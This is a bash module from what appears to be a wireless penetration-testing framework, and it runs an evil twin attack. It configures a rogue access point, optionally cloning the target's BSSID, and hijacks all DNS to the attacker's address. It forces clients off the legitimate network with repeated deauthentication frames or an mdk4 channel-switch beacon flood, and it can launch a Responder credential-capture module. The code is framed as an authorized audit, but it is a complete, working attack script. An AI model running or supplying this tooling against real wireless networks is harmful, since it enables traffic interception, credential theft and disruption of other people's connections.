#!/usr/bin/env bash
# MODULE_META
# NAME="Rogue AP / Evil Twin"
# CATEGORY="F"
# DEPS="A1"
# CRITICAL="yes"
# TOOLS="hostapd,dnsmasq,iptables,mdk4"
# DESC="Deploy evil twin AP to test client susceptibility and WIDS response"
# REQS="managed_iface,target_ssid,nat"
# PCAP="yes"
# DECODE="dhcp"

#===============================================================================
#  modules/f1_rogue_ap.sh
#  F1: Rogue AP / Evil Twin (Golden Wrapper)
#
#  METHODOLOGY (SPEC ALIGNED):
#  1. Choose between SSID Spoofing (New BSSID) or BSSID Cloning (Exact BSSID).
#  2. Deploy rogue AP via hostapd.
#  3. Optional: Use mdk4 CSA (Channel Switch Announcement) to force roam.
#  4. Provide synchronized NAT/DNS via Go-Brain and local dnsmasq.
#===============================================================================

set -euo pipefail

C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
C_VAR="${ASTRA_COLOR_VAR:-}"
C_BOLD="${ASTRA_COLOR_BOLD:-}"
C_ACTION="${ASTRA_COLOR_ACTION:-}"
C_RESET="${ASTRA_COLOR_RESET:-}"

# SNR Safeguard (Red Team Hardening)
if [[ "${ASTRA_TARGET_RSSI:-0}" -ne 0 ]] && [[ "${ASTRA_TARGET_RSSI:-0}" -lt -75 ]]; then
    echo -e "\n${C_PROMPT}[!] WARNING:${C_RESET} ${C_BOLD}Low Signal Strength Detected (${ASTRA_TARGET_RSSI}dBm).${C_RESET}"
    echo -e "[*] Rogue AP will be significantly weaker than the legitimate AP, making roams unlikely."
    stty sane
    read -p "$(echo -e "${C_ACTION} [?] Continue anyway? [y/N]: ${C_RESET}")" snr_continue
    [[ "$snr_continue" != "y" ]] && exit 0
fi

# Inputs from Environment
# ...

if [[ -z "$INTERFACE" || -z "$SSID" ]]; then
    echo "[!] WIFI_INTERFACE or GUEST_SSID not set."
    exit 1
fi

echo -e "${C_PROMPT}[*]${C_RESET} Initializing Rogue AP tactical options..."

# Intelligence Insight
if [[ "${ASTRA_TARGET_PMF:-}" != "None" ]]; then
    echo -e "\n${C_PROMPT}[!] INTELLIGENCE ALERT:${C_RESET} ${C_BOLD}Target supports PMF (802.11w).${C_RESET}"
    echo -e "[*] Deauthentication may be ignored. CSA Catalyst (Option 3) is recommended."
fi

# 1. Interactive Selection
echo -e "${C_PROMPT}[?]${C_RESET} ${C_BOLD}Select Rogue AP Mode:${C_RESET}"
echo "    1) SSID Only (Random BSSID)"
echo -e "    2) BSSID Clone (Match Target AP MAC: ${C_VAR}${TARGET_BSSID:-Unknown}${C_RESET})"
stty sane
read -p "$(echo -e "${C_ACTION} Selection [1/2]: ${C_RESET}")" mode_choice

BSSID_LINE=""
if [[ "$mode_choice" == "2" ]] && [[ -n "$TARGET_BSSID" ]]; then
    echo -e "[*] Cloning BSSID: ${C_VAR}$TARGET_BSSID${C_RESET}"
    BSSID_LINE="bssid=$TARGET_BSSID"
fi

echo -e "${C_PROMPT}[?]${C_RESET} ${C_BOLD}Select Roaming Catalyst:${C_RESET}"
echo "    1) None (Wait for natural roam)"
echo "    2) Targeted Deauth (Surgical)"
echo "    3) CSA (Channel Switch Announcement - Stealthier)"
stty sane
read -p "$(echo -e "${C_ACTION} Selection [1-3]: ${C_RESET}")" catalyst_choice

# 2. Configuration
HOSTAPD_CONF="${EVIDENCE_PREFIX}_hostapd.conf"
DNSMASQ_CONF="${EVIDENCE_PREFIX}_dnsmasq.conf"
HOSTAPD_LOG="${EVIDENCE_DIR}/${TC_ID}_hostapd.log"
DNSMASQ_LOG="${EVIDENCE_DIR}/${TC_ID}_dnsmasq.log"

cat <<EOF > "$HOSTAPD_CONF"
interface=$INTERFACE
driver=nl80211
ssid=$SSID
$BSSID_LINE
hw_mode=g
channel=${GUEST_CHANNEL:-6}
auth_algs=1
wpa=0
EOF

cat <<EOF > "$DNSMASQ_CONF"
interface=$INTERFACE
dhcp-range=192.168.44.10,192.168.44.100,12h
dhcp-option=3,$INTERNAL_IP
dhcp-option=6,$INTERNAL_IP
address=/#/$INTERNAL_IP
log-queries
log-dhcp
EOF

# 3. Execution
cleanup() {
    echo "[*] Cleaning up Rogue AP processes..."
    [[ -n "${HOSTAPD_PID:-}" ]] && kill "$HOSTAPD_PID" 2>/dev/null || true
    [[ -n "${DNSMASQ_PID:-}" ]] && kill "$DNSMASQ_PID" 2>/dev/null || true
    [[ -n "${CSA_PID:-}" ]] && kill "$CSA_PID" 2>/dev/null || true
}
trap cleanup EXIT

echo "[*] Starting DNS hijacker..."
dnsmasq -C "$DNSMASQ_CONF" -k --log-facility="$DNSMASQ_LOG" &
DNSMASQ_PID=$!

echo "[*] Starting hostapd..."
hostapd "$HOSTAPD_CONF" > "$HOSTAPD_LOG" 2>&1 &
HOSTAPD_PID=$!

# Roaming Catalyst Execution
if [[ "$catalyst_choice" == "2" ]] && [[ -n "$TARGET_BSSID" ]]; then
    echo "[*] Starting targeted deauth catalyst..."
    # Use aireplay-ng in background to periodically nudge clients
    (
        while kill -0 $HOSTAPD_PID 2>/dev/null; do
            aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$INTERFACE" > /dev/null 2>&1 || true
            sleep 20
        done
    ) &
elif [[ "$catalyst_choice" == "3" ]] && [[ -n "$TARGET_BSSID" ]]; then
    if command -v mdk4 &>/dev/null; then
        echo "[*] Starting CSA catalyst via mdk4..."
        # mdk4 b -c: Beacon flood with Channel Switch Announcement
        mdk4 "$INTERFACE" b -n "$SSID" -c 11 > /dev/null 2>&1 &
        CSA_PID=$!
    else
        echo "[!] mdk4 not found. Falling back to natural roam."
    fi
fi

echo -e "${C_PROMPT}[*]${C_RESET} Rogue AP active for ${C_VAR}${SCAN_TIME}s${C_RESET}. Monitoring for connections..."

# Support Module Hook: Responder (Spec Section 5)
stty sane
read -p "$(echo -e "${C_ACTION} [?] Launch Responder pivot in background? [y/N]: ${C_RESET}")" responder_choice
if [[ "$responder_choice" == "y" ]]; then
    echo -e "${C_PROMPT}[*]${C_RESET} Spawning Responder support module..."
    "$ASTRA_BIN" launch-support --tc "G6" --session-dir "$SESSION_DIR"
fi

ELAPSED=0
while [[ $ELAPSED -lt $SCAN_TIME ]]; do
    PERCENT=$(( ELAPSED * 100 / SCAN_TIME ))
    STATUS="AP active (monitoring for roams)... ($(( SCAN_TIME - ELAPSED ))s left)"
    "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PERCENT" --status "$STATUS"
    
    sleep 5
    ((ELAPSED+=5))
done

# 4. Cleanup early to finalize logs
cleanup
trap - EXIT

# 5. Reporting
if grep -qi "authenticated" "$HOSTAPD_LOG"; then
    V_MAC=$(grep -i "authenticated" "$HOSTAPD_LOG" | awk '{print $3}' | head -1)
    echo "[!] SUCCESS: CLIENT CONNECTED TO ROGUE AP!"
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "Rogue AP Susceptibility" \
        --severity CRITICAL \
        --desc "A client device (${V_MAC:-Unknown}) automatically connected to the rogue AP with SSID: $SSID." \
        --target "$SSID" \
        --evidence "$HOSTAPD_LOG" \
        --rationale "Automatic connection to unauthorized Access Points allows an attacker to intercept all client traffic, perform MITM attacks, and serve malicious content."
else
    echo "[+] Rogue AP test complete. No connections during this interval."
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "[F1] Audit Complete" \
        --severity INFO \
        --desc "Deployed a rogue AP for ${SCAN_TIME}s on $INTERFACE. No clients connected." \
        --target "$SSID" \
        --evidence "$HOSTAPD_LOG" \
        --rationale "Testing for rogue AP susceptibility confirms current client resistance to unauthorized BSSIDs."
fi

exit 0
